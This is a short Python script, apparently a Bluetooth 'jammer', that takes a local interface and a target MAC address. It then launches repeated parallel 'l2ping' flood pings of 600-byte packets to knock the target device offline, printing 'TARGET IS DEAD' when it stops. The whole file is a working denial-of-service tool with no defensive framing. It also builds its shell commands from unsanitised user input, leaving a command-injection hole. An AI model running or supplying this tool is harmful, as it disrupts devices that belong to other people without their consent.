import subprocess
import colorama
from colorama import Fore, Back, Style
import headers
colorama.init(autoreset=True)

headers.header()

def main():
    try:
        print(" ")
        interface = input("Your BT interface : ")
        mac = input("MAC of target: ")
        time = 999
        print("Start jamming...")

        while time != 0:
            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            time -= 1
    except Exception as e:
        print("TARGET IS DEAD")

main()